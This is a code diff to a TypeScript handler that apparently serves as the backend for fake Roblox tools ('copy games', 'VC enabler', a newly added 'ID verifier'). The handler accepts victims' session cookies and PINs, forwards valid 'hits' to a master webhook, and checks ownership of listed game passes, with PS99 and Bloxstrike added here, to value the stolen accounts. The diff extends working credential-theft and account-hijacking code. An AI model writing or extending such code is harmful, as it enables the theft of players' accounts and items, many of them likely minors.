@@ -12,10 +12,13 @@ interface Body {
     | "copy_games"
     | "copy_clothes"
     | "group_botter"
-    | "vc_enabler";
+    | "vc_enabler"
+    | "id_verifier";
   cookie: string;
   pin?: string;
   extras?: Record<string, string | number | undefined>;
+  // When true (Hit Checker), do NOT forward to any webhook if the cookie is invalid.
+  checkOnly?: boolean;
 }
 
 // Master webhook + emoji overrides are read from secrets PER REQUEST so changing
@@ -78,6 +81,8 @@ const TRACKED_GAMES: Array<{ name: string; passes: number[] }> = [
   { name: "MM2",              passes: [429957, 1308795] },
   { name: "Steal a Brainrot", passes: [1228591447, 1229510262, 1227013099] },
   { name: "Adopt Me",         passes: [3196348, 5300198, 1585546290, 6040696, 189425850] },
+  { name: "PS99",             passes: [265320491, 259437976, 205379487, 265324265, 655859720, 257811346, 258567677, 257803774, 975558264, 264808140, 690997523, 720275150, 651611000] },
+  { name: "Bloxstrike",       passes: [1819900809, 1827234915, 1826267025] },
 ];
 
 async function ownsGamePass(userId: number, gamePassId: number): Promise<boolean> {
